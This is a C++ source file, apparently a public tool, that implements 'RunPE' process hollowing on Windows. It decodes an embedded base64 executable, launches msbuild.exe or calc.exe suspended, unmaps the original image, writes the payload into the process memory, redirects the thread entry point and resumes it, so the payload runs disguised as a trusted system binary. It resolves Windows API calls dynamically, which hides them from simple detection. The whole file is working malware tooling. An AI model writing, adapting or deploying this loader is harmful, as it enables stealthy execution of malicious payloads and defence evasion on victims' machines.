#include <windows.h>
#include <iostream>

/*
    Author : Suleiman Al-Othman || twitter, github (@sulealothman)
    Project : Inject PE File in Other Process Memory (RunPE)
    Ver. : 0.1
    Supported Native/.NET
*/

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i <4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j <4; j++)
            char_array_4[j] = 0;

        for (j = 0; j <4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }
    return ret;
}

char kerDll[] = "kernel32.dll";

char kerCP[] = "CreateProcessA";
typedef  BOOL(WINAPI *CreateProcessAA) (LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);

char kerVAE[] = "VirtualAllocEx";
typedef LPVOID(WINAPI * VirtualAllocExA) (HANDLE, LPVOID, SIZE_T, DWORD,DWORD);

char ntDll[] = "ntdll.dll";

char ntRVM[] = "NtReadVirtualMemory";
typedef LONG(NTAPI * NtReadVirtualMemory) (HANDLE, PVOID, PVOID, ULONG, PULONG);

char ntWVM[] = "NtWriteVirtualMemory";
typedef LONG(NTAPI * NtWriteVirtualMemory) (HANDLE, PVOID, PVOID, ULONG, PULONG);


char ntUVOS[] = "NtUnmapViewOfSection";
typedef LONG(NTAPI * NtUnmapViewOfSection) (HANDLE, PVOID);

char ntGCT[] = "NtGetContextThread";
typedef LONG(NTAPI * NtGetContextThread) (HANDLE, PCONTEXT);

char ntSCT[] = "NtSetContextThread";
typedef LONG(NTAPI * NtSetContextThread) (HANDLE, PCONTEXT);

char ntRT[] = "NtResumeThread";
typedef LONG(NTAPI * NtResumeThread) (HANDLE);

int RunPeEXE(void *buff, LPSTR path) {

    DWORD baseAddr;
    LPVOID pEXE;
    PIMAGE_DOS_HEADER pDHeader;
    PIMAGE_NT_HEADERS pNtHeader;
    PIMAGE_SECTION_HEADER pSHeader;
    STARTUPINFO SI;
    PROCESS_INFORMATION PI;
    PCONTEXT ctx;

    CreateProcessAA sCreateProcess;
    VirtualAllocExA sVirtualAllocEx;

    NtUnmapViewOfSection sNtUnmapViewOfSection;

    NtReadVirtualMemory sNtReadVirtualMemory;
    NtWriteVirtualMemory sNtWriteVirtualMemory;

    NtGetContextThread sNtGetContextThread;
    NtSetContextThread sNtSetContextThread;
    NtResumeThread sNtResumeThread;

    ZeroMemory(&SI, sizeof(SI));
    ZeroMemory(&PI, sizeof(PI));


    pDHeader = (PIMAGE_DOS_HEADER)buff;

    if (pDHeader->e_magic != IMAGE_DOS_SIGNATURE) return 1;

    pNtHeader = (PIMAGE_NT_HEADERS)(buff + pDHeader->e_lfanew);

    if ((sCreateProcess = CreateProcessAA(GetProcAddress(GetModuleHandle(kerDll), kerCP))) == 0) return 1;

    if (!sCreateProcess(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) return 1;

    ctx = (PCONTEXT)VirtualAlloc(NULL, sizeof(ctx), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    ctx->ContextFlags = CONTEXT_FULL;
    if ((sNtGetContextThread = NtGetContextThread(GetProcAddress(GetModuleHandle(ntDll), ntGCT))) == 0) return 1;

    sNtGetContextThread(PI.hThread, (LPCONTEXT)ctx);

    if ((sNtReadVirtualMemory = NtReadVirtualMemory(GetProcAddress(GetModuleHandle(ntDll), ntRVM))) == 0) return 1;

    sNtReadVirtualMemory(PI.hProcess, PVOID(ctx->Ebx + 8), &baseAddr, sizeof(DWORD), NULL);

    if ((DWORD)baseAddr == pNtHeader->OptionalHeader.ImageBase)
    {
        if ((sNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandle(ntDll), ntUVOS))) == 0) return 1;

        sNtUnmapViewOfSection(PI.hProcess, PVOID(baseAddr));
    }

    if ((sVirtualAllocEx = VirtualAllocExA(GetProcAddress(GetModuleHandle(kerDll), kerVAE))) == 0) return 1;

    pEXE = sVirtualAllocEx(PI.hProcess, (LPVOID)pNtHeader->OptionalHeader.ImageBase, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if ((sNtWriteVirtualMemory = NtWriteVirtualMemory(GetProcAddress(GetModuleHandle(ntDll), ntWVM))) == 0) return 1;

    sNtWriteVirtualMemory(PI.hProcess, (PVOID)pEXE, buff, pNtHeader->OptionalHeader.SizeOfHeaders, NULL);

    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        pSHeader = (PIMAGE_SECTION_HEADER)(buff + pDHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
        sNtWriteVirtualMemory(PI.hProcess, (PVOID)((DWORD)pEXE + pSHeader->VirtualAddress), buff + pSHeader->PointerToRawData, pSHeader->SizeOfRawData, NULL);
    }
    sNtWriteVirtualMemory(PI.hProcess, (LPVOID)(ctx->Ebx + 8), (LPVOID)&pNtHeader->OptionalHeader.ImageBase, sizeof(DWORD), NULL);
    ctx->Eax =(DWORD)pEXE + pNtHeader->OptionalHeader.AddressOfEntryPoint;


    if ((sNtSetContextThread = NtSetContextThread(GetProcAddress(GetModuleHandle(ntDll), ntSCT))) == 0) return 1;

    sNtSetContextThread(PI.hThread, LPCONTEXT(ctx));

    if ((sNtResumeThread = NtResumeThread(GetProcAddress(GetModuleHandle(ntDll), ntRT))) == 0) return 1;

    sNtResumeThread(PI.hThread);

    return 1;
}

int main() {

    LPSTR injectPath = getenv("windir");
    //strcat(injectPath, "\\system32\\calc.exe"); for Native
    //strcat(injectPath, "\\Microsoft.NET\\Framework\\v2.0.50727\\msbuild.exe"); for .NET
    strcat(injectPath, "\\Microsoft.NET\\Framework\\v2.0.50727\\msbuild.exe");
    std::string b64Str = "Base64String";
    unsigned char * bBin = (unsigned char*)base64_decode(b64Str).c_str();
    RunPeEXE((void*)bBin, injectPath);
    return 0;
}
